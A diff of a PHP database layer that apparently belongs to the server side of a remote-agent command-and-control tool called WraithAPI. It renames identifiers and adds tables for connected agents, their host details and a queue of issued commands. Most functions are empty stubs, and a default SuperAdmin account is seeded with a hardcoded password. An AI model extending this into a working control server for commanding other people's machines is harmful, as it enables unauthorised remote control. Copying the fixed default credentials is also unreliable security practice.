@@ -20,58 +20,58 @@ try {
     // If not, prepare the database
 
     // SQL Commands to be executed to initialise the database
-    $db_init_commands = [
+    $dbInitCommands = [
         // Settings table
         "CREATE TABLE IF NOT EXISTS `WraithAPI_Settings` (
-            `Key` TEXT,
-            `Value` TEXT
+            `key` TEXT,
+            `value` TEXT
         );",
         // Statistics table
         "CREATE TABLE IF NOT EXISTS `WraithAPI_Stats` (
-            `Key` TEXT,
-            `Value` TEXT
+            `key` TEXT,
+            `value` TEXT
         );",
         // Connected Wraiths table
         "CREATE TABLE IF NOT EXISTS `WraithAPI_ActiveWraiths` (
-            `AssignedID` TEXT,
-            `HostProperties` TEXT,
-            `WraithProperties` TEXT,
-            `LastHeartbeatTime` TEXT,
-            `IssuedCommands` TEXT
+            `assignedID` TEXT,
+            `hostProperties` TEXT,
+            `wraithProperties` TEXT,
+            `lastHeartbeatTime` TEXT,
+            `issuedCommands` TEXT
         );",
         // Command queue table
         "CREATE TABLE IF NOT EXISTS `WraithAPI_CommandsIssued` (
-            `CommandID` TEXT,
-            `CommandName` TEXT,
-            `CommandParams` TEXT,
-            `CommandTargets` TEXT,
-            `CommandResponses` TEXT,
-            `TimeIssued` TEXT
+            `commandID` TEXT,
+            `commandName` TEXT,
+            `commandParams` TEXT,
+            `commandTargets` TEXT,
+            `commandResponses` TEXT,
+            `timeIssued` TEXT
         );",
         // Users table
         "CREATE TABLE IF NOT EXISTS `WraithAPI_Users` (
-            `UserID` INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT UNIQUE,
-            `UserName` TEXT,
-            `UserPassword` TEXT,
-            `UserPrivileges` TEXT
+            `userID` INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT UNIQUE,
+            `userName` TEXT,
+            `userPassword` TEXT,
+            `userPrivileges` TEXT
         );",
         // Users table
         "CREATE TABLE IF NOT EXISTS `WraithAPI_Sessions` (
-            `UserID` INTEGER,
-            `SessionToken` TEXT,
-            `LastSessionHeartbeat` TEXT
+            `userID` INTEGER,
+            `sessionToken` TEXT,
+            `lastSessionHeartbeat` TEXT
         );",
         // Create default settings entries
         "INSERT INTO `WraithAPI_Settings` VALUES (
-            'WraithMarkOfflineDelay',
+            'wraithMarkOfflineDelay',
             '16'
         );",
         "INSERT INTO `WraithAPI_Settings` VALUES (
-            'WraithInitialCryptKey',
+            'wraithInitialCryptKey',
             'QWERTYUIOPASDFGHJKLZXCVBNM'
         );",
         "INSERT INTO `WraithAPI_Settings` VALUES (
-            'WraithSwitchCryptKey',
+            'wraithSwitchCryptKey',
             'QWERTYUIOPASDFGHJKLZXCVBNM'
         );",
         "INSERT INTO `WraithAPI_Settings` VALUES (
@@ -79,7 +79,7 @@ try {
             'ABCDEFGHIJKLMNOP'
         );",
         "INSERT INTO `WraithAPI_Settings` VALUES (
-            'WraithDefaultCommands',
+            'wraithDefaultCommands',
             '" . json_encode([]) . "'
         );",
         "INSERT INTO `WraithAPI_Settings` VALUES (
@@ -87,39 +87,39 @@ try {
             'W_'
         );",
         "INSERT INTO `WraithAPI_Settings` VALUES (
-            'RequestIPBlacklist',
+            'requestIPBlacklist',
             '" . json_encode([]) . "'
         );",
         "INSERT INTO `WraithAPI_Settings` VALUES (
-            'ManagementSessionExpiryDelay',
+            'managementSessionExpiryDelay',
             '12'
         );",
         "INSERT INTO `WraithAPI_Settings` VALUES (
-            'ManagementAuthCode',
+            'managementAuthCode',
             ''
         );",
         "INSERT INTO `WraithAPI_Settings` VALUES (
-            'ManagementIPWhitelist',
+            'managementIPWhitelist',
             '[]'
         );",
         // Create a stats table entry
         "INSERT INTO `WraithAPI_Stats` VALUES (
-            'DatabaseSetupAPIVersion',
+            'databaseSetupAPIVersion',
             '" . API_VERSION . "'
         );",
         // Create a stats table entry
         "INSERT INTO `WraithAPI_Stats` VALUES (
-            'DatabaseSetupTime',
+            'databaseSetupTime',
             '" . time() . "'
         );",
         // Mark the database as initialised
         "CREATE TABLE IF NOT EXISTS `DB_INIT_INDICATOR` (
             `DB_INIT_INDICATOR` INTEGER
         );"
-    ]; // TODO: Set default of NoCrypt to 0
+    ];
 
     // Execute the SQL queries to initialise the database
-    foreach ($db_init_commands as $command) {
+    foreach ($dbInitCommands as $command) {
 
         $db->exec($command);
 
@@ -128,10 +128,10 @@ try {
 }
 
 // Set the global SETTINGS variable with the settings from the database
-$settings_table = $db->query("SELECT * FROM WraithAPI_Settings");
+$settingsTable = $db->query("SELECT * FROM WraithAPI_Settings");
 $SETTINGS = [];
-foreach ($settings_table as $table_row) {
-    $SETTINGS[$table_row[0]] = $table_row[1];
+foreach ($settingsTable as $tableRow) {
+    $SETTINGS[$tableRow[0]] = $tableRow[1];
 }
 
 // Check whether a user account exists
@@ -149,17 +149,17 @@ try {
 
     // Create default super admin user
 
-    $user_entry_creation_command = "INSERT INTO `WraithAPI_Users` (
-        `UserName`,
-        `UserPassword`,
-        `UserPrivileges`
+    $userCreationCommand = "INSERT INTO `WraithAPI_Users` (
+        `userName`,
+        `userPassword`,
+        `userPrivileges`
     ) VALUES (
         'SuperAdmin',
         '" . password_hash("SuperAdminPassword", PASSWORD_BCRYPT) . "',
         '2'
     );";
 
-    $db->exec($user_entry_creation_command);
+    $db->exec($userCreationCommand);
 
 }
 
@@ -171,30 +171,30 @@ $API_USERS = $db->query("SELECT * FROM WraithAPI_Users LIMIT 1")->fetchAll();
 // WRAITH
 
 // Add a Wraith to the database
-function db_add_wraith($wraith) {
+function dbAddWraith($wraith) {
 
-    global $db;
+    global $SETTINGS, $db;
 
     $statement = $db->prepare("INSERT INTO `WraithAPI_ActiveWraiths` (
-        `AssignedID`,
-        `HostProperties`,
-        `WraithProperties`,
-        `LastHeartbeatTime`,
-        `IssuedCommands`
+        `assignedID`,
+        `hostProperties`,
+        `wraithProperties`,
+        `lastHeartbeatTime`,
+        `issuedCommands`
     ) VALUES (
-        :AssignedID,
-        :HostProperties,
-        :WraithProperties,
-        :LastHeartbeatTime,
-        :IssuedCommands
+        :assignedID,
+        :hostProperties,
+        :wraithProperties,
+        :lastHeartbeatTime,
+        :issuedCommands
     )");
 
     // Bind the parameters in the query with variables
-    $statement->bindParam(":AssignedID", $wraith["AssignedID"]);
-    $statement->bindParam(":HostProperties", $wraith["HostProperties"]);
-    $statement->bindParam(":WraithProperties", $wraith["WraithProperties"]);
-    $statement->bindParam(":LastHeartbeatTime", $wraith["LastHeartbeatTime"]);
-    $statement->bindParam(":IssuedCommands", $wraith["IssuedCommands"]);
+    $statement->bindParam(":assignedID", $wraith["assignedID"]);
+    $statement->bindParam(":hostProperties", $wraith["hostProperties"]);
+    $statement->bindParam(":wraithProperties", $wraith["wraithProperties"]);
+    $statement->bindParam(":lastHeartbeatTime", $wraith["lastHeartbeatTime"]);
+    $statement->bindParam(":issuedCommands", $wraith["issuedCommands"]);
 
     // Execute the statement to add a Wraith
     $statement->execute();
@@ -202,11 +202,11 @@ function db_add_wraith($wraith) {
 }
 
 // Remove Wraith(s)
-function db_remove_wraiths($ids) {
+function dbRemoveWraiths($ids) {
 
-    global $db;
+    global $SETTINGS, $db;
 
-    $statement = $db->prepare("DELETE FROM `WraithAPI_ActiveWraiths` WHERE AssignedID == :IDToDelete");
+    $statement = $db->prepare("DELETE FROM `WraithAPI_ActiveWraiths` WHERE assignedID == :IDToDelete");
 
     // Remove each ID
     foreach ($ids as $id) {
@@ -218,26 +218,26 @@ function db_remove_wraiths($ids) {
 
 // Check which Wraiths have not sent a heartbeat in the mark dead time and remove
 // them from the database
-function db_expire_wraiths() {
+function dbExpireWraiths() {
 
-    global $db;
+    global $SETTINGS, $db;
 
     // Remove all Wraith entries where the last heartbeat time is older than
-    // the $SETTINGS["MarkOfflineDelay"]
+    // the $SETTINGS["wraithMarkOfflineDelay"]
     $statement = $db->prepare("DELETE FROM `WraithAPI_ActiveWraiths`
-        WHERE `LastHeartbeatTime` < :earliest_valid_heartbeat");
-    // Get the unix timestamp for $SETTINGS["MarkOfflineDelay"] seconds ago
-    $earliest_valid_heartbeat = time()-$SETTINGS["WraithMarkOfflineDelay"];
-    $statement->bindParam(":earliest_valid_heartbeat", $earliest_valid_heartbeat);
+        WHERE `lastHeartbeatTime` < :earliestValidHeartbeat");
+    // Get the unix timestamp for $SETTINGS["wraithMarkOfflineDelay"] seconds ago
+    $earliestValidHeartbeat = time()-$SETTINGS["wraithMarkOfflineDelay"];
+    $statement->bindParam(":earliestValidHeartbeat", $earliestValidHeartbeat);
     // Execute
     $statement->execute();
 
 }
 
 // Get a list of Wraiths and their properties
-function db_get_wraiths() {
+function dbGetWraiths() {
 
-    global $db;
+    global $SETTINGS, $db;
 
     // TODO
 
@@ -246,27 +246,27 @@ function db_get_wraiths() {
 // COMMAND
 
 // Issue a command to Wraith(s)
-function db_issue_commands($command) {
+function dbIssueCommand($command) {
 
-    global $db;
+    global $SETTINGS, $db;
 
     // TODO
 
 }
 
 // Delete command(s) from the command table
-function db_cancel_commands($ids) {
+function dbCancelCommands($ids) {
 
-    global $db;
+    global $SETTINGS, $db;
 
     // TODO
 
 }
 
 // Get command(s)
-function db_get_commands($ids) {
+function dbGetCommands($ids) {
 
-    global $db;
+    global $SETTINGS, $db;
 
     // TODO
 
@@ -275,45 +275,45 @@ function db_get_commands($ids) {
 // USERS & SETTINGS
 
 // Edit an API setting
-function db_edit_settings($id, $value) {
+function dbEditSettings($setting, $value) {
 
-    global $db;
+    global $SETTINGS, $db;
 
     // TODO
 
 }
 
 // Create a new user
-function db_add_users($userdata) {
+function dbAddUsers($user) {
 
-    global $db;
+    global $SETTINGS, $db;
 
     // TODO
 
 }
 
 // Change username
-function db_change_user_name($user_id, $new_username) {
+function dbChangeUserName($userID, $newUsername) {
 
-    global $db;
+    global $SETTINGS, $db;
 
     // TODO
 
 }
 
 // Change user password
-function db_change_user_pass($user_id, $new_password) {
+function dbChangeUserPass($userID, $newPassword) {
 
-    global $db;
+    global $SETTINGS, $db;
 
     // TODO
 
 }
 
 // Change user privilege level (0=User, 1=Admin, 2=SuperAdmin)
-function db_change_user_privilege($user_id, $new_privilege_level) {
+function dbChangeUserPrivilege($userID, $newPrivilegeLevel) {
 
-    global $db;
+    global $SETTINGS, $db;
 
     // TODO
 
@@ -322,20 +322,20 @@ function db_change_user_privilege($user_id, $new_privilege_level) {
 // SESSIONS
 
 // Create a session for a user
-function db_create_session($userID) {
+function dbCreateSession($userID) {
 
-    global $db;
+    global $SETTINGS, $db;
 
     $statement = $db->prepare("INSERT INTO `WraithAPI_Sessions` (
-        `UserID`,
-        `SessionID`,
-        `SessionToken`,
-        `LastSessionHeartbeat`
+        `userID`,
+        `sessionID`,
+        `sessionToken`,
+        `lastSessionHeartbeat`
     ) VALUES (
-        :UserID,
-        :SessionID,
-        :SessionToken,
-        :LastSessionHeartbeat
+        :userID,
+        :sessionID,
+        :sessionToken,
+        :lastSessionHeartbeat
     )");
 
     // Create session variables
@@ -344,10 +344,10 @@ function db_create_session($userID) {
     $lastSessionHeartbeat = time();
 
     // Bind the parameters in the query with variables
-    $statement->bindParam(":UserID", $userID);
-    $statement->bindParam(":SessionID", $sessionID);
-    $statement->bindParam(":SessionToken", $sessionToken);
-    $statement->bindParam(":LastSessionHeartbeat", $lastSessionHeartbeat);
+    $statement->bindParam(":userID", $userID);
+    $statement->bindParam(":sessionID", $sessionID);
+    $statement->bindParam(":sessionToken", $sessionToken);
+    $statement->bindParam(":lastSessionHeartbeat", $lastSessionHeartbeat);
 
     // Execute the statement to add a Wraith
     $statement->execute();
@@ -355,13 +355,13 @@ function db_create_session($userID) {
 }
 
 // Delete a session
-function db_destroy_session($sessionID) {
+function dbDestroySession($sessionID) {
 
-    global $db;
+    global $SETTINGS, $db;
 
     // Remove the session with the specified ID
     $statement = $db->prepare("DELETE FROM `WraithAPI_Sessions`
-        WHERE `SessionID` = :sessionID");
+        WHERE `sessionID` = :sessionID");
     $statement->bindParam(":sessionID", $sessionID);
     // Execute
     $statement->execute();
@@ -369,17 +369,17 @@ function db_destroy_session($sessionID) {
 }
 
 // Delete sessions which have not had a heartbeat recently
-function db_expire_sessions() {
+function dbExpireSessions() {
 
-    global $db;
+    global $SETTINGS, $db;
 
     // Remove all sessions where the last heartbeat time is older than
-    // the $SETTINGS["ManagementSessionExpiryDelay"]
+    // the $SETTINGS["managementSessionExpiryDelay"]
     $statement = $db->prepare("DELETE FROM `WraithAPI_Sessions`
-        WHERE `LastSessionHeartbeat` < :earliest_valid_heartbeat");
-    // Get the unix timestamp for $SETTINGS["ManagementSessionExpiryDelay"] seconds ago
-    $earliest_valid_heartbeat = time()-$SETTINGS["ManagementSessionExpiryDelay"];
-    $statement->bindParam(":earliest_valid_heartbeat", $earliest_valid_heartbeat);
+        WHERE `lastSessionHeartbeat` < :earliestValidHeartbeat");
+    // Get the unix timestamp for $SETTINGS["managementSessionExpiryDelay"] seconds ago
+    $earliestValidHeartbeat = time()-$SETTINGS["managementSessionExpiryDelay"];
+    $statement->bindParam(":earliestValidHeartbeat", $earliestValidHeartbeat);
     // Execute
     $statement->execute();
 
@@ -388,18 +388,18 @@ function db_expire_sessions() {
 // STATS
 
 // Update a statistic
-function db_get_stats($stat_id) {
+function dbGetStats($statID) {
 
-    global $db;
+    global $SETTINGS, $db;
 
     // TODO
 
 }
 
 // Update a statistic
-function db_update_stats($stat_id, $new_value) {
+function dbUpdateStats($statID, $newValue) {
 
-    global $db;
+    global $SETTINGS, $db;
 
     // TODO
 
